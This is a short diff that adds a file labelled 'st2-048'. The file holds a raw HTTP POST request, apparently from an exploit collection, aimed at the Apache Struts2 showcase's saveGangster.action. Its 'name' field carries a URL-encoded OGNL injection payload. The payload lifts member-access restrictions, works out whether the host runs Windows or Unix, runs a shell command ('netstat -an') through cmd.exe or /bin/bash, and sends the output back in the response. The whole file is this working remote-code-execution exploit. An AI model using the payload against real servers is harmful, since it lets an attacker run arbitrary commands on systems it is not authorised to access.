@@ -1,0 +1,11 @@
+--------------------st2-048------------------------------------
+POST /struts2-showcase/integration/saveGangster.action HTTP/1.0
+Connection: close
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 904
+
+age=1&__checkbox_bustedBefore=true&name=%24%7B%28%23dm%3D%40%5Cu006Fgnl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3D%23dm%29.%28%23ef%3D%27netstat+-an%27%29.%28%23iswin%3D%28%40%5Cu006Aava.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23efe%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23ef%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23ef%7D%29%29.%28%23p%3Dnew+%5Cu006Aava.lang.ProcessBuilder%28%23efe%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D%22%2C+%27age%27%3A%27bbb%27%2C+%27__checkbox_bustedBefore%27%3A%27true%27%2C+%27description%27%3A%27ccc%27+&description=1
+---------------------------------------------------------------
